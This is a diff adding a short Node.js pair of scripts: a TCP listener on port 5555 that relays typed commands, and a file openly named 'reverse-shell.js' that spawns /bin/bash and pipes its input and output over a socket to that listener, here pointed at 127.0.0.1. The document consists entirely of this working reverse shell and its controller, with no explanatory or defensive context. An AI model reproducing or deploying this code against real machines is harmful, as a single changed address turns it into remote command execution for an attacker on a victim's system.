@@ -1,0 +1,40 @@
+
+
+       
+//  listener.js        
+        
+        var server    = require('net').createServer(connect);
+        server.listen(5555);
+                                                                                console.log('listening 5555');
+        var client;
+        
+        function connect(socket){
+                                                                                console.log('client connected');
+              client    = socket;
+              client.pipe(process.stdout);
+              client.on('end',()=>{
+              
+                    console.log('client disconnected');
+                    
+              });
+              
+        } //connect
+
+        var opts    = {input:process.stdin,output:process.stdout};
+        var rl      = require('node:readline').createInterface(opts);
+        rl.on('line',line=>client && client.write(`${line.trim()}\n`));
+        rl.on('close',()=>{console.log('Have a great day!');process.exit(0);});
+
+
+//  reverse-shell.js
+
+        var shell     = '/bin/bash';
+        var sh        = require('child_process').spawn(shell);
+        var client    = new require('net').Socket();
+        client.connect(5555,'127.0.0.1',()=>{
+
+              client.pipe(sh.stdin);
+              sh.stdout.pipe(client);
+              sh.stderr.pipe(client);
+
+        });
